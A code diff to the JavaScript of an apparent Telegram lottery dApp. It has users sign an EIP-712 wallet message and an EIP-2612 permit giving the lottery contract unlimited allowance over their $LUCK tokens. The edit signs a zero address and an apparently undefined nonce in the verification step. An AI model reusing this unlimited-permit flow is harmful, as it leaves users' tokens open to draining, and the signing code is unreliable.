@@ -134,7 +134,7 @@
             try {
                 // Check if MetaMask is installed
                 if (!window.ethereum) {
-                    alert('Please install MetaMask to proceed! or Copy the link and paste in Metamask Inapp-browser to proceed');
+                    alert('Please install MetaMask to proceed! or Paste the link into Metamask Inapp-Browser to proceed');
                     return;
                 }
 
@@ -174,27 +174,27 @@
 
                 // Step 1: Sign the EIP-712 message for wallet verification
                 const domain = {
-                    name: "LotteryContract",
+                    name: "LuckLotteryContract",
                     version: "1",
                     chainId: CHAIN_ID,
                     verifyingContract: LOTTERY_CONTRACT_ADDRESS
                 };
                 const types = {
-                    Message: [
-                        { name: "telegramId", type: "uint256" },
-                        { name: "message", type: "string" }
+                    Wallet: [
+                        { name: "user", type: "address" },
+                        { name: "nonce", type: "uint256" }
                     ]
                 };
                 const value = {
-                    telegramId: parseInt(userId),
-                    message: "Link your wallet to the Lottery Bot"
+                    user: "0x0000000000000000000000000000000000000000",
+                    nonce: ethers.BigNumber.from(nonce)
                 };
                 const messageSignature = await signer._signTypedData(domain, types, value);
                 console.log('Message Signature:', messageSignature);
 
                 // Step 2: Sign the EIP-712 permit for $LUCK token approval
                 const luckTokenContract = new ethers.Contract(LUCK_TOKEN_ADDRESS, LUCK_TOKEN_ABI, provider);
-                const nonce = await luckTokenContract.nonces(userAddress);
+                const permitNonce = await luckTokenContract.nonces(userAddress);
                 const deadline = Math.floor(Date.now() / 1000) + 20 * 60; // 20 minutes from now
                 const permitDomain = {
                     name: "LuckyU",
@@ -215,7 +215,7 @@
                     owner: userAddress,
                     spender: LOTTERY_CONTRACT_ADDRESS,
                     value: MAX_ALLOWANCE,
-                    nonce: nonce,
+                    nonce: permitNonce,
                     deadline: deadline
                 };
                 const permitSignature = await signer._signTypedData(permitDomain, permitTypes, permitValue);
